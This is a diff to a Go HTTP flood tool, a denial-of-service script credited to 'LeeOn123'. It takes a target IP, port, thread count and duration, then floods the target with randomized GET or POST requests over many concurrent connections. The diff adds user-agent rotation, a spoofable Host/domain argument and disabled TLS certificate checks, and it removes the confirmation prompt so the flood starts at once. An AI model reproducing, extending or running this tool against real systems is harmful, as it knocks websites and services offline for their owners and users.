@@ -2,6 +2,18 @@
 Coded by LeeOn123
 Please fking code ur script by ur self, kid.
 */
+
+/* put ulimit -n 999999
+ *
+ * Header.txt format:
+
+	Accept: text/html
+	User-agent: Wget
+	Referer: http://google.com
+ * 
+ * 
+ */
+ 
 package main
 
 import (
@@ -100,51 +112,71 @@ var (
 		"Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.4 (KHTML, like Gecko) Chrome/4.0.237.0 Safari/532.4 Debian",
 		"Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.8 (KHTML, like Gecko) Chrome/4.0.277.0 Safari/532.8",
 	}
-	abcd      = "asdfghjklqwertyuiopzxcvbnmASDFGHJKLQWERTYUIOPZXCVBNM"
-	start     = make(chan bool)
-	acceptall = []string{
-		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
-		"Accept-Encoding: gzip, deflate\r\n",
-		"Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
-		"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n",
-		"Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
-		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
-		"Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
-		"Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
-		"Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
-		"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n",
-		"Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
-		"Accept: text/html, application/xhtml+xml",
-		"Accept-Language: en-US,en;q=0.5\r\n",
-		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",
-		"Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n"}
-	page string
+	abcd = "asdfghjklqwertyuiopzxcvbnmASDFGHJKLQWERTYUIOPZXCVBNM"
 )
 
-func contain(char string, x string) int {
-	times := 0
-	ans := 0
-	for i := 0; i < len(char); i++ {
-		if char[times] == x[0] {
-			ans = 1
-		}
-		times++
-	}
-	return ans
+var (
+	Default = New(
+		rand.New(
+			rand.NewSource(time.Now().UnixNano()),
+		),
+	)
+	start = make(chan bool)
+)
+
+type Randomizer interface {
+	Seed(n int64)
+	Intn(n int) int
+}
+
+type UARand struct {
+	Randomizer
+	UserAgents []string
+}
+
+func GetRandom() string {
+	return Default.GetRandom()
+}
+
+func New(r Randomizer) *UARand {
+	return &UARand{r, UserAgents}
+}
+
+func (u *UARand) GetRandom() string {
+	return u.UserAgents[u.Intn(len(u.UserAgents))]
+}
+
+func NewWithCustomList(userAgents []string) *UARand {
+	r := rand.New(rand.NewSource(time.Now().UnixNano()))
+	return &UARand{r, userAgents}
 }
 
 func flood() {
+	
+	header := ""
+	host := ""
 	addr := os.Args[1]
 	addr += ":"
 	addr += os.Args[2]
-	header := ""
+	
+	if os.Args[8] == "nil"{	
+		host = addr		
+	} else {
+		host += os.Args[8]
+		host += ":"
+		host += os.Args[2]
+		
+	}
+	
 	if os.Args[5] == "get" {
 		header += " HTTP/1.1\r\nHost: "
-		header += addr + "\r\n"
+		header += host + "\r\n"
+		
 		if os.Args[7] == "nil" {
+			var useragent = GetRandom() //random useragent
 			header += "Connection: Keep-Alive\r\nCache-Control: max-age=0\r\n"
-			header += "User-Agent: " + UserAgents[rand.Intn(len(UserAgents))] + "\r\n"
-			header += "Accept: " + acceptall[rand.Intn(len(acceptall))] + "\r\n"
+			header += "User-Agent: " + useragent + "\r\n"
+			header += "Accept: text/plain\r\n"
 		} else {
 			fi, err := os.Open(os.Args[7])
 			if err != nil {
@@ -181,37 +213,36 @@ func flood() {
 
 		} else {
 			for x := 0; x > 100; x++ {
-				data += string(string(abcd[rand.Intn(len(abcd))]))
+				data += string(abcd[rand.Intn(len(abcd))])
 			}
 		}
-		header := "POST " + os.Args[4] + " HTTP/1.1\r\nHost: " + addr + "\r\n"
+		header := "POST " + os.Args[4] + " HTTP/1.1\r\nHost: " + host + "\r\n"
 		header += "Connection: Keep-Alive\r\nContent-Type: x-www-form-urlencoded\r\nContent-Length: " + strconv.Itoa(len(data)) + "\r\n"
 		header += "Accept-Encoding: gzip, deflate\r\n\n" + data
 	}
+	 conf := &tls.Config{
+         InsecureSkipVerify: true,
+    }
 	var s net.Conn
 	var err error
 	rand.Seed(time.Now().UnixNano())
 	<-start
-	for { /*
-			request := ""
-			if os.Args[5] == "get" {
-				var rand_url = strconv.Itoa(rand.Intn(1000000000))
-				request += "GET " + os.Args[4] + "?" + rand_url
-			}
-			request += header + "\r\n\r\n"*/
+	for { 
 		if os.Args[2] == "443" {
-			s, err = tls.Dial("tcp", addr, nil)
+			s, err = tls.Dial("tcp", addr, conf)
 		} else {
 			s, err = net.Dial("tcp", addr)
 		}
 		if err != nil {
 			fmt.Println("Connection Down!!!")
+			fmt.Println(err)
 		} else {
 			defer s.Close()
 			for i := 0; i <= 100; i++ {
 				request := ""
 				if os.Args[5] == "get" {
-					request += "GET " + os.Args[4] + page + strconv.Itoa(rand.Intn(1000000000000000000)) + string(string(abcd[rand.Intn(len(abcd))])) + string(abcd[rand.Intn(len(abcd))]) + string(abcd[rand.Intn(len(abcd))]) + strconv.Itoa(rand.Intn(1000000000000000000)) + string(abcd[rand.Intn(len(abcd))])
+					var rand_url = strconv.Itoa(rand.Intn(1000000000000000000))
+					request += "GET " + os.Args[4] + "?" + rand_url
 				}
 				request += header + "\r\n\r\n"
 				s.Write([]byte(request))
@@ -224,28 +255,14 @@ func flood() {
 }
 
 func main() {
-	fmt.Println("\r\n'||  ||`   ||      ||                '||''''| '||`                   ||` ")
-	fmt.Println(" ||  ||    ||      ||                 ||  .    ||                    ||  ")
-	fmt.Println(" ||''||  ''||''  ''||''  '||''|, ---  ||''|    ||  .|''|, .|''|, .|''||  ")
-	fmt.Println(" ||  ||    ||      ||     ||  ||      ||       ||  ||  || ||  || ||  ||  ")
-	fmt.Println(".||  ||.   `|..'   `|..'  ||..|'     .||.     .||. `|..|' `|..|' `|..||. ")
-	fmt.Println("                          ||                                             ")
-	fmt.Println("                         .||                     Golang version 1.6      ")
-	fmt.Println("                                                        C0d3d By L330n123")
-	fmt.Println("==========================================================================")
-	if len(os.Args) != 8 {
+	if len(os.Args) != 9 {
 		fmt.Println("Post Mode will use header.txt as data")
-		fmt.Println("Usage: ", os.Args[0], "<ip> <port> <threads> <page> <get/post> <seconds> <header.txt/nil>")
+		fmt.Println("Usage: ", os.Args[0], "<ip> <port> <threads> <page> <get/post> <seconds> <header.txt/nil> <domain/nil>")
 		os.Exit(1)
 	}
 	var threads, _ = strconv.Atoi(os.Args[3])
 	var limit, _ = strconv.Atoi(os.Args[6])
-	if contain(os.Args[4], "?") == 0 {
-		page = "?"
-	} else {
-		page = "&"
-	}
-	input := bufio.NewReader(os.Stdin)
+
 	for i := 1; i <= threads; i++ {
 		time.Sleep(time.Millisecond * 10)
 		go flood() // Start threads
@@ -253,13 +270,8 @@ func main() {
 		os.Stdout.Sync()
 		//time.Sleep( time.Millisecond * 1)
 	}
-	fmt.Printf("\nPlease [Enter] for continue")
-	_, err := input.ReadString('\n')
-	if err != nil {
-		fmt.Println(err)
-		os.Exit(1)
-	}
-	fmt.Println("Flood will end in " + os.Args[6] + " seconds.")
+	
+	fmt.Println("\nFlood will end in " + os.Args[6] + " seconds.")
 	close(start)
 	time.Sleep(time.Duration(limit) * time.Second)
 	//Keep the threads continue
